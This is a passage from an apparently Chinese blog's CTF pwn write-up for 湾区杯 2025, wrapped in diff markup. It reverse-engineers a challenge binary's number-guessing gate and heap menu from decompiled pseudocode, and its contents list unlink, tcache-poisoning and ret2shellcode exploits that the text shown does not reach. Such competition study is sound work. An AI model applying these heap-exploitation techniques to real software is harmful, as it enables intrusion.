@@ -1,0 +1,1022 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    湾区杯 2025 PWN | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="前言：大概快一个多月没有打过堆风水的题目了，期间或许偶尔碰见那么一两道吧，也都比较简单。国外的比赛经常给一些异构 pwn 或者某些偏于真实的程序，大部分都是篡改指针，然后反复跳转，难点在于读懂程序，最近国内比赛多起来了，开始复现国内的题目发现大部分都是堆风水，然后典型的堆覆盖泄露 libc 然后打 apple2 之类的，感觉长时间不写有点退化了，像湾区杯的 armpwn 也是在写题过程中学到了不少">
+<meta property="og:type" content="article">
+<meta property="og:title" content="湾区杯 2025 PWN">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="前言：大概快一个多月没有打过堆风水的题目了，期间或许偶尔碰见那么一两道吧，也都比较简单。国外的比赛经常给一些异构 pwn 或者某些偏于真实的程序，大部分都是篡改指针，然后反复跳转，难点在于读懂程序，最近国内比赛多起来了，开始复现国内的题目发现大部分都是堆风水，然后典型的堆覆盖泄露 libc 然后打 apple2 之类的，感觉长时间不写有点退化了，像湾区杯的 armpwn 也是在写题过程中学到了不少">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-001.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-002.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-003.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-004.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-005.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-006.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-007.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-008.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-009.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-010.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-011.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-012.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-013.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-014.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-015.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-016.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-017.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-018.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-019.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-020.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-021.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-022.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-023.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-024.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-025.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-026.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-027.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-028.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-029.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-030.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-031.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-032.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-033.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-034.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-035.png">
+<meta property="article:published_time" content="2026-08-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-16T17:24:12.510Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="湾区杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-001.png">
+    <link rel="canonical" href="https://idcm-svg.github.io/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/">
+      <meta name="keywords" content="南阳理工学院, 网络安全, 软件安全, 计软, CTF, Pwn, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"湾区杯 2025 PWN | HFTTC's Blog","headline":"湾区杯 2025 PWN","description":"心之所向，无问西东","url":"https://idcm-svg.github.io/HFTTC.github.io/2026/08/17/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025-pwn/","inLanguage":"zh-CN"}</script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/notice">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">公告</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/HFTTC.github.io/images/pwn/covers/wanqubei-2025-pwn.jpg" alt="湾区杯 2025 PWN">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">湾区杯 2025 PWN</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#digtal-bomb%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">digtal_bomb：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">main：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">菜单：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#modify%EF%BC%9A"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">modify：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解法一：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-base%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">泄露 libc_base：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%B1%80%EF%BC%9A"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">构造基本格局：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E5%A4%9A%E4%BD%99%E7%9A%84-fd-%E5%92%8C-bk-%E6%8C%87%E9%92%88%EF%BC%9A"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">清理多余的 fd 和 bk 指针：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%A0%86%E5%A4%B4%EF%BC%9A"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">伪造第二个堆头：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Unlink%EF%BC%9A"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">Unlink：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-unlink-%E8%AF%BB%E5%8F%96-libc%EF%BC%9A"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">触发 unlink 读取 libc：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-base"><span class="toc-number">1.2.2.</span> <span class="toc-text">泄露 heap_base:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#teache-poisioning"><span class="toc-number">1.2.3.</span> <span class="toc-text">teache poisioning</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#singal%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">singal：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-main-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析 main 函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-BAC"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">sub_BAC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-123C%EF%BC%9A"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">sub_123C：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#case1%EF%BC%9A"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">case1：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case2%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">case2：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text">过随机数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-canary%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">泄露 canary：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode%EF%BC%9A"><span class="toc-number">2.2.3.</span> <span class="toc-text">ret2shellcode：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">145</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-湾区杯2025-pwn" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-16T16:00:00.000Z" itemprop="datePublished">2026-08-17</time>
+    <time style="display: none;" id="post-update-time">2026-08-17</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-08-16T17:24:12.510Z" itemprop="dateModified">2026-08-17</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>前言：大概快一个多月没有打过堆风水的题目了，期间或许偶尔碰见那么一两道吧，也都比较简单。国外的比赛经常给一些异构 pwn 或者某些偏于真实的程序，大部分都是篡改指针，然后反复跳转，难点在于读懂程序，最近国内比赛多起来了，开始复现国内的题目发现大部分都是堆风水，然后典型的堆覆盖泄露 libc 然后打 apple2 之类的，感觉长时间不写有点退化了，像湾区杯的 armpwn 也是在写题过程中学到了不少知识。</p>
+<h2 id="digtal-bomb："><a href="#digtal-bomb：" class="headerlink" title="digtal_bomb："></a>digtal_bomb：</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-001.png"></p>
+<p>2.35 版本的 libc，开启了 canary，pie 和 Full RELEO</p>
+<h3 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h3><h4 id="main："><a href="#main：" class="headerlink" title="main："></a>main：</h4><p>我们先进入到 main 函数去看，做一个简单的逆向，之后得出主要的菜单在 <code>main-&gt;sub_1BD8-&gt;sub_19AF</code>，简单看一下运行到这里的条件吧，取一点关键的伪代码(命名经过简单修改)：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter min (0-500): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;min);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter max (0-500): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;max);</span><br><span class="line"></span><br><span class="line">v4 = time(<span class="number">0</span>);</span><br><span class="line">srand(v4);</span><br><span class="line">result1 = rand() % (max - min) + min;</span><br><span class="line">result2 = sub_1B38(); <span class="comment">// v1 = rand() % (max - min + 1) + min; return v1;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_1BDB(result2, result1) != <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*sub_1BDB*/</span></span><br><span class="line">sub_1B85(result1, result2);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  if ( a1 &gt;= a2 )</span></span><br><span class="line"><span class="comment">    max = a1 - 1;</span></span><br><span class="line"><span class="comment">  else</span></span><br><span class="line"><span class="comment">    min = a1 + 1;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( a2 == min &amp;&amp; a2 == max )</span><br><span class="line">&#123;</span><br><span class="line">    puts_1(<span class="string">&quot;Your cooperation with the computer disarmed the bomb !&quot;</span>);</span><br><span class="line">    sub_19AF();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么最终要求 <code>result2 == min &amp;&amp; result2 == max</code>，这首先要保证 <code>max == min</code>，</p>
+<p>然后令 <code>result1 + 1 == max</code>或者<code>result1 - 1 == min</code>即可。但是 result1 和随机数有关我们无法控制，那就尝试构造与随机数无关的 result1，也就是令 <code>max - min == 1</code>，这样 result2 一定大于 result1，且 <code>result1 == min</code>，触发 <code>min = a1 + 1;</code>，最终就是 <code>min = min++;</code></p>
+<p>综上所述，只要我们依次填入符合 n，n+1，n+1 的数即可进入菜单：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-002.png"></p>
+<h4 id="菜单："><a href="#菜单：" class="headerlink" title="菜单："></a>菜单：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_19AF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _DWORD v0[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    v0[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            menu();</span><br><span class="line">            v0[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v0);</span><br><span class="line">            <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">                ;</span><br><span class="line">            <span class="keyword">if</span> ( v0[<span class="number">0</span>] != <span class="number">666</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            sub_1812();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v0[<span class="number">0</span>] &gt; <span class="number">666</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            LABEL_15:</span><br><span class="line">            puts_1(<span class="string">&quot;Invalid choice, please try again.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v0[<span class="number">0</span>] == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            show();</span><br><span class="line">        